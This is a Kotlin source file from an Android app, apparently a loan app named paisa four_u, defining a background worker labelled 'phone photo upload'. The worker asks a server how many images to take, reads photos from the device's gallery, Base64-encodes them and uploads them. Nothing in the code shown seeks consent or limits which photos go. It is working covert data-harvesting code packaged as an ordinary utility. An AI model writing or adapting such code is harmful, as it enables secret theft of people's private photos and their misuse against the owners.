package com.paisa.four_u.util.workManager

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.MediaStore
import android.util.Base64
import android.webkit.MimeTypeMap
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.gson.Gson
import com.paisa.four_u.model.UploadPhotoModel
import com.paisa.four_u.net.paisa_ApiServices
import com.paisa.four_u.net.paisa_HttpManager
import com.paisa.four_u.util.expand.createBody
import java.io.File


/**
 * 手机照片上传
 */
class paisa_PhotoWM (private val context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {

    private val goon = Gson()
    private val mApiService by lazy { paisa_HttpManager.create(paisa_ApiServices::class.java) }



    override suspend fun doWork(): Result {
        try {

            val picNumber=     mApiService.getPicNumber(HashMap<String, Any>().createBody())

            val size=  picNumber.ret.toInt()


            val photoList=   getSystemPhotoList(context)?.subList(0,size)

            val uploads= mutableListOf<UploadPhotoModel>()

            photoList?.let {
                val dataMap = HashMap<String, Any>()
                for (path in photoList) {
                    val file=File(path)
                    val type = MimeTypeMap.getFileExtensionFromUrl(file.path)
                    val imgData: String = Base64.encodeToString(file.readBytes(), Base64.NO_WRAP)
                    uploads.add(UploadPhotoModel(imgData,type))
                }
                dataMap["pictures"] = uploads
                mApiService.uploadPics(dataMap.createBody())
            }
            return Result.success()
        } catch (e: Exception) {
            return Result.failure()
        }

    }

    fun getSystemPhotoList(context: Context): List<String>? {
        val result: MutableList<String> = ArrayList()
        val uri: Uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val contentResolver: ContentResolver = context.contentResolver
        val cursor: Cursor? = contentResolver.query(uri, null, null, null, null)
        if (cursor == null || cursor.getCount() <= 0) return null // 没有图片
        while (cursor.moveToNext()) {
            val index: Int = cursor
                .getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
            val path: String = cursor.getString(index) // 文件地址
            val file = File(path)
            if (file.exists()) {
                result.add(path)

            }
        }
        return result
    }


}